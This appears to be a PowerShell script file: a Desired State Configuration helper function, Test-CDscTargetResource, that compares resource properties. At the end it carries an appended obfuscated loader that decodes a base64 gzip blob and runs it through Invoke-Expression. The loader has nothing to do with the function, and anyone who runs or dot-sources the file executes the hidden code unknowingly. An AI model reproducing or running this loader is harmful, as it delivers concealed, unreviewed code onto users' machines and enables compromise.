
function Test-CDscTargetResource
{
    
    [CmdletBinding()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]
        
        $TargetResource,

        [Parameter(Mandatory=$true)]
        [hashtable]
        
        $DesiredResource,

        [Parameter(Mandatory=$true)]
        [string]
        
        $Target
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $notEqualProperties = $TargetResource.Keys | 
                            Where-Object { $_ -ne 'Ensure' } |  
                            Where-Object { $DesiredResource.ContainsKey( $_ ) } |
                            Where-Object { 
                                $desiredObj = $DesiredResource[$_]
                                $targetObj = $TargetResource[$_]

                                if( $desiredobj -eq $null -or $targetObj -eq $null )
                                {
                                    return ($desiredObj -ne $targetObj)
                                }

                                if( -not $desiredObj.GetType().IsArray -or -not $targetObj.GetType().IsArray )
                                {
                                    return ($desiredObj -ne $targetObj)
                                }

                                if( $desiredObj.Length -ne $targetObj.Length )
                                {
                                    return $true
                                }

                                $desiredObj | Where-Object { $targetObj -notcontains $_ }
                            }

    if( $notEqualProperties )
    {
        Write-Verbose ('{0} has stale properties: ''{1}''' -f $Target,($notEqualProperties -join ''','''))
        return $false
    }

    return $true
}

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAL1We2/aSBD/Gz7FqopkW+UZuJREitTFQIBgwiMBUorQYi9mw9pL7HUI1/a73/hBSi5JL1Wls2Rpd2dmd+Y3zyGV2aH0mCkNYVGUHVHPZ8JFx+n0UU20JDpHn5X0MnBNGR6Hi7lN5XzjCXNOLMujvo++pVM94hEHqUcPxJs7wgo4zaBoEzJSK/ColkqlU9FR4PpkSecukeyBzh0qV8Ly4SF1ijebmnAIc2dnZ3rgedSV8T53QSX2feosOKO+qqHvaLyiHs1eLe6oKdE3dDTPXXCxIDxh2+nEXIFB2LVCWkeYJLQgN9xwJlXl61dFm2aLs1z9PiDcV5XhzpfUyVmcKxr6oYUPXu82VFUMZnrCF0uZGzO3dJy7ibTvRsobse6KlgbbPCoDz0VvmxjeGUuoCix7gAyOEVS0XMt9EGuqHrkB5xn0WZ0mCg0CVzKHAl1ST2yG1HtgJvVzTeJanA7ocqZ26XaPw3uF1EMh4OpJT8sk7nuP7kbk4vg6RXup/UEcaPC9iAUt/SP9SlRZlFObSDqXAP1BWKVTqWm0pGCP2hM+i+TOUSGDDFCCSOHtYHt07QVUm6Fp6LrpbJY8u5f0M29eVNxLJTKxM2M9ztF0JJg1S6ciP0f0kDBfBIxb1AsZ3o7cGl0yl9Z2LnGYuQ9O9TWn0SWnESC5PVsXFFWVhECtWgKPEiI6fSlWd5h8kq3GymETHO+DVhAT2nNlYieqSss1qAMAxnsFnLWElKB77iQNdvvXwz0wKTonvp9BvQBy0sygISWcWhmEXZ8lJBxIES2Vn+oaAZfMJL7cXzfTXoE0eVoXri+9wAT3AgzXww01GeEhKhnUZBat7obM3qugvIqJTjhnrg03PYBP4CTEYijDoPGszL8DRMsNqWw5G04d4I4qRoMTG+pDklJRvBGbWsov1N4nSpwVIVZ7kA6UhgAYciEzaMQ8CTVIybyIvD9U73lJeqan7tHEk2qUitPqToYJE3GaYSc4fwIzgs6TAFvDE06V+PSkHLYM11Y/5K9YG8N323K5YbXXrNjawm/Af8NKLVH7ZF2275p5w9T93kWjgtnW3pqVLjaXrNJoT4CvzwqtCrb0Tr/JGtvm4BJbVTizb1nRtrHVu+vVnU635VeLyT2xvFkuNycFXCqVr0qFtUXbIf8aW12HbR87sIbaetWpglyhxettfbAYHze+jHkzX26slmPhD0/KXyzDrN73L2xcBxtIL5+vbqv3+GJ1u2n0eP501D8hNlCqxDD54GZsYx/3McH6toqBbywuiN0dkvpoWzq9zhdHeqehD+5xoy0uL05Pyw/50cqsFhaOwMQG/pbr2JXbOqOXta3NOku9b8D5mNiD4eiYSZd//JQ/HXdGer8fnWMMj1cPaYBP/4YVtmuwq97GzRbr9wHz/rqOm/rJKY3uHB3f4Y+yVAH9J8Qg41Wxky/eAn9LGm1s/7Wd9JukpxcFX+SLy9N1u1oTN3n4io9mhz9uyaTKJ81u4XYyKJrFyqNxd1u4wvj8A4RUKh1FyCJYLuO69x8NxyCevyIcYgeaxj7jG8JrJKW/J1gooaqvDxZr6rmUQ9OFtrzPE8y5MMNm9UbXgNYZN7QZ1IMbWJaOX11p6IlR+9nB9kdnZ1/AkCQBw4TIdahry1Wm8FgqFKDtFB7LBS39fvt1sdmpT7dlws51AOXhQzx6SEvHUK/kCnLV+p+xTupD9PTvY/3z7BfUd+FfyByC9IL4/OB33PHnEI0JkyA6hDrIadzJ34tUEoAHc9OBpyHClskXjrlXgcx2YapKK5/T6dYSHSDks79hwKX3qKKFs5IviSezd2IB03DUMtQjoqFWfYKOCPqBsgAK9kvHMBJ7dhD2DxRP+N/RFkyJBL+jATUpjH3ZtlhAX6AwBoRXR5eEzHD2D1MZNTgyDAAA"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

